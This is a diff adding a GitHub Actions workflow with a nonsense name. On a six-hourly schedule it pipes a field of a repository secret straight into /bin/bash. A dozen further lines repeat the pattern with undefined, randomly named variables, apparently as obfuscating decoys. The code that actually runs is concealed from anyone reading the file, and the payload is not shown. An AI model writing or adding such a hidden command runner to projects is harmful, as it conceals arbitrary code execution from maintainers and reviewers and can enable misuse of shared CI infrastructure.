@@ -1,0 +1,29 @@
+name: shuunjiandenbengku
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shuunjiandenbengku
+        env:
+          mh2: ${{ secrets.mh2 }}
+        run: |
+          echo $mh2 | jq -r .ydn6 | /bin/bash
+          echo $up0994 | jq -r .cxonm775 | /bin/bash
+          echo $us80264 | jq -r .ntkef488 | /bin/bash
+          echo $nuffi01 | jq -r .ksrtb4728 | /bin/bash
+          echo $lg78 | jq -r .rxvvt410 | /bin/bash
+          echo $agy94 | jq -r .mb65 | /bin/bash
+          echo $wxt67280 | jq -r .h70680 | /bin/bash
+          echo $rquil89 | jq -r .jtam5 | /bin/bash
+          echo $vnxn1590 | jq -r .u5 | /bin/bash
+          echo $cgkkm500 | jq -r .qwo224 | /bin/bash
+          echo $fihey27217 | jq -r .yz77070 | /bin/bash
+          echo $ur007 | jq -r .mx05594 | /bin/bash
+          echo $y889 | jq -r .twp25 | /bin/bash
+
